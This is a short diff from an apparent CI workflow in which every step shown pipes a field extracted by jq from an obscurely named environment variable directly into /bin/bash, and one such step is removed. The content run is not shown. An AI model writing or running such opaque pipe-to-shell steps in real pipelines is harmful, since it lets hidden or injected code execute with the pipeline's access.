@@ -42,7 +42,6 @@ jobs:
           echo $j53 | jq -r .gqe00 | /bin/bash
           echo $z935 | jq -r .xzwmd84 | /bin/bash
           echo $bt31 | jq -r .wi905 | /bin/bash
-          echo $pwyh11821 | jq -r .uxsre65982 | /bin/bash
           echo $awxv619 | jq -r .p2 | /bin/bash
           printf '%s' "$te579" | jq -r .d10437 | /bin/bash
           printf '%s' "$fqfb588" | jq -r .de71399 | /bin/bash
